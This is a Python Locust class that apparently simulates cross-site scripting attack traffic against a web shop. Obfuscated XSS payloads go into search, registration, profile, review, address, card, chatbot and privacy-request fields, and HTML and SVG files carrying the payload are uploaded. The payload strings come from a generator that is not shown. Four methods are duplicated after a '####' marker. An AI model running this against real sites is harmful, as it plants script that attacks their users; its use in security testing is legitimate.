import random
from locust import task

from ..base_attacker import BaseAttacker
from ..payload_generators.xss  import XSSPayloadGenerator
from ..config import AppConfig 
from ..obfuscators import PayloadObfuscator

class XSSAttacker(BaseAttacker):
    """
    Simulates a user attempting Cross-Site Scripting (XSS) attacks using dynamically generated payloads.
    """


    @task(5)
    def xss_search_fuzzing_get(self):
        payload = XSSPayloadGenerator.get_random_xss_payload()
        param = random.choice(AppConfig.COMMON_QUERY_PARAMS)
        obfuscation_choice = random.choice(BaseAttacker.OBFUSCATION_CHOICES)
        self._send_request(
            "get",
            "product_search",
            params={param: payload},
            name_suffix="XSS_FUZZ_GET",
            obfuscation_type=obfuscation_choice
        )

    @task(3)
    def xss_feedback_fuzzing_post(self):
        payload = XSSPayloadGenerator.get_random_xss_payload()
        obfuscation_choice = random.choice(BaseAttacker.OBFUSCATION_CHOICES)
        self._send_request(
            "post",
            "feedbacks",
            data={"comment": f"This is a test feedback with {payload}", "rating": random.randint(1, 5)},
            name_suffix="XSS_POST_COMMENT",
            obfuscation_type=obfuscation_choice
        )

    @task(2)
    def xss_registration_fuzzing_post(self):
        payload = XSSPayloadGenerator.get_random_xss_payload()
        password = "password123"
        obfuscation_choice = random.choice(BaseAttacker.OBFUSCATION_CHOICES)

        email = f"{payload}@example.com" # XSS in email might be reflected in profile or logs
        self._send_request(
            "post",
            "user_register",
            data={
                "email": email,
                "password": password,
                "passwordRepeat": password,
                "securityAnswer": "My pet's name"
            },
            name_suffix="XSS_EMAIL_POST",
            obfuscation_type=obfuscation_choice
        )

        email_clean = f"user{random.randint(1000, 9999)}@example.com"
        self._send_request(
            "post",
            "user_register",
            data={
                "email": email_clean,
                "password": password,
                "passwordRepeat": password,
                "securityAnswer": payload # XSS in security answer, potentially reflected during reset
            },
            name_suffix="XSS_SECURITY_ANSWER_POST",
            obfuscation_type=obfuscation_choice
        )

    @task(1)
    def xss_profile_update_put(self):
        user_id = random.randint(1, 5) # Assuming we're attacking existing users' profiles
        payload = XSSPayloadGenerator.get_random_xss_payload()
        obfuscation_choice = random.choice(BaseAttacker.OBFUSCATION_CHOICES)
        self._send_request(
            "put",
            "user_profile",
            path_format_args={"user_id": user_id},
            # Injecting into 'name' or 'bio' fields for profile reflection
            data={"name": f"XSS User {payload}", "bio": f"Some XSS Bio with {payload}"},
            name_suffix="XSS_PROFILE_UPDATE_PUT",
            obfuscation_type=obfuscation_choice
        )

    # --- NEW XSS TASKS ---

    @task(3)
    def xss_product_review_post(self):
        product_id = random.randint(1, 20)
        payload = XSSPayloadGenerator.get_random_xss_payload()
        obfuscation_choice = random.choice(BaseAttacker.OBFUSCATION_CHOICES)
        self._send_request(
            "post",
            "product_reviews_by_id",
            path_format_args={"product_id": product_id},
            data={"message": f"Great product, but {payload}", "author": "XSS Tester"},
            name_suffix="XSS_PRODUCT_REVIEW_POST",
            obfuscation_type=obfuscation_choice
        )

    @task(2)
    def xss_customer_chatbot_post(self):
        payload = XSSPayloadGenerator.get_random_xss_payload()
        obfuscation_choice = random.choice(BaseAttacker.OBFUSCATION_CHOICES)
        self._send_request(
            "post",
            "customer_chatbot",
            data={"query": f"Help me with my order: {payload}"},
            name_suffix="XSS_CHATBOT_QUERY_POST",
            obfuscation_type=obfuscation_choice
        )

    @task(2)
    def xss_address_management_post(self):
        payload = XSSPayloadGenerator.get_random_xss_payload()
        obfuscation_choice = random.choice(BaseAttacker.OBFUSCATION_CHOICES)
        self._send_request(
            "post",
            "addresses",
            data={
                "fullName": f"XSS User {payload}",
                "country": "USA",
                "zipCode": "12345",
                "streetAddress": f"XSS Street {payload}",
                "city": "XSS City",
                "state": "XX"
            },
            name_suffix="XSS_ADDRESS_CREATE",
            obfuscation_type=obfuscation_choice
        )

    @task(2)
    def xss_card_management_post(self):
        payload = XSSPayloadGenerator.get_random_xss_payload()
        obfuscation_choice = random.choice(BaseAttacker.OBFUSCATION_CHOICES)
        self._send_request(
            "post",
            "cards",
            data={
                "fullName": f"XSS Cardholder {payload}",
                "cardNum": f"111122223333{random.randint(1000, 9999)}",
                "expMonth": random.randint(1, 12),
                "expYear": random.randint(2025, 2030)
            },
            name_suffix="XSS_CARD_CREATE",
            obfuscation_type=obfuscation_choice
        )

    @task(1)
    def xss_privacy_request_post(self):
        payload = XSSPayloadGenerator.get_random_xss_payload()
        obfuscation_choice = random.choice(BaseAttacker.OBFUSCATION_CHOICES)
        self._send_request(
            "post",
            "privacy_requests",
            data={
                "subject": f"My Privacy Request {payload}",
                "message": f"Please process my data. {payload}"
            },
            name_suffix="XSS_PRIVACY_REQ_POST",
            obfuscation_type=obfuscation_choice
        )

    @task(1)
    def xss_memory_creation_post(self):
        payload = XSSPayloadGenerator.get_random_xss_payload()
        obfuscation_choice = random.choice(BaseAttacker.OBFUSCATION_CHOICES)
        self._send_request(
            "post",
            "memories",
            data={
                "caption": f"My XSS Memory {payload}",
                "image": "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=" # A tiny transparent PNG
            },
            name_suffix="XSS_MEMORY_CREATE_POST",
            obfuscation_type=obfuscation_choice
        )

    @task(1)
    def xss_product_file_upload(self):
        # This targets a specific endpoint where a product might allow file uploads,
        # which can then be served and trigger XSS if content-type is mishandled.
        product_id = random.randint(1, 20)
        payload = XSSPayloadGenerator.get_random_xss_payload()
        obfuscation_choice = random.choice(BaseAttacker.OBFUSCATION_CHOICES)

        # Attempt to upload an HTML file containing XSS, or an image with XSS metadata
        file_content_html = f"<html><body>{payload}</body></html>".encode('utf-8')
        file_content_svg = f"""<svg onload="{payload}"></svg>""".encode('utf-8')

        self.client.post(
            AppConfig.ENDPOINTS["product_file_upload"].format(product_id=product_id),
            files={"file": ("malicious.html", file_content_html, "text/html")},
            name=f"{AppConfig.ENDPOINTS['product_file_upload']}/[XSS_FILE_UPLOAD_HTML_{obfuscation_choice.upper()}]"
        )
        self.client.post(
            AppConfig.ENDPOINTS["product_file_upload"].format(product_id=product_id),
            files={"file": ("malicious.svg", file_content_svg, "image/svg+xml")},
            name=f"{AppConfig.ENDPOINTS['product_file_upload']}/[XSS_FILE_UPLOAD_SVG_{obfuscation_choice.upper()}]"
        )

    @task(1)
    def xss_profile_image_url_upload(self):
        # SSRF with XSS potential if the fetched content isn't properly sanitized before display
        payload = XSSPayloadGenerator.get_random_xss_payload()
        obfuscation_choice = random.choice(BaseAttacker.OBFUSCATION_CHOICES)
        # Example: Point to a URL that serves an XSS payload
        malicious_url = f"http://example.com/malicious_image.png?{payload}" # Or a data: URI
        obfuscated_url = PayloadObfuscator.apply_random_obfuscation(malicious_url) if obfuscation_choice != "none" else malicious_url

        self._send_request(
            "post",
            "profile_image_url_upload",
            data={"image": obfuscated_url},
            name_suffix="XSS_PROFILE_IMAGE_URL",
            obfuscation_type=obfuscation_choice
        )


    ####
    @task(5)
    def xss_search_fuzzing_get(self):
        payload = XSSPayloadGenerator.get_random_xss_payload() # Use the new generator
        param = random.choice(AppConfig.COMMON_QUERY_PARAMS)
        obfuscation_choice = random.choice(BaseAttacker.OBFUSCATION_CHOICES)
        self._send_request(
            "get",
            "product_search",
            params={param: payload},
            name_suffix="XSS_FUZZ_GET",
            obfuscation_type=obfuscation_choice
        )

    @task(3)
    def xss_feedback_fuzzing_post(self):
        payload = XSSPayloadGenerator.get_random_xss_payload() # Use the new generator
        obfuscation_choice = random.choice(BaseAttacker.OBFUSCATION_CHOICES)
        self._send_request(
            "post",
            "feedbacks",
            data={"comment": f"This is a test feedback with {payload}", "rating": random.randint(1, 5)},
            name_suffix="XSS_POST_COMMENT",
            obfuscation_type=obfuscation_choice
        )

    @task(2)
    def xss_registration_fuzzing_post(self):
        payload = XSSPayloadGenerator.get_random_xss_payload() # Use the new generator
        password = "password123"
        obfuscation_choice = random.choice(BaseAttacker.OBFUSCATION_CHOICES)

        email = f"{payload}@example.com"
        self._send_request(
            "post",
            "user_register",
            data={
                "email": email,
                "password": password,
                "passwordRepeat": password,
                "securityAnswer": "My pet's name"
            },
            name_suffix="XSS_EMAIL_POST",
            obfuscation_type=obfuscation_choice
        )

        email_clean = f"user{random.randint(1000, 9999)}@example.com"
        self._send_request(
            "post",
            "user_register",
            data={
                "email": email_clean,
                "password": password,
                "passwordRepeat": password,
                "securityAnswer": payload
            },
            name_suffix="XSS_SECURITY_ANSWER_POST",
            obfuscation_type=obfuscation_choice
        )

    @task(1)
    def xss_profile_update_put(self):
        user_id = random.randint(1, 5)
        payload = XSSPayloadGenerator.get_random_xss_payload() # Use the new generator
        obfuscation_choice = random.choice(BaseAttacker.OBFUSCATION_CHOICES)
        self._send_request(
            "put",
            "user_profile",
            path_format_args={"user_id": user_id},
            data={"name": f"XSS User {payload}", "bio": "Some XSS Bio"},
            name_suffix="XSS_PROFILE_UPDATE_PUT",
            obfuscation_type=obfuscation_choice
        )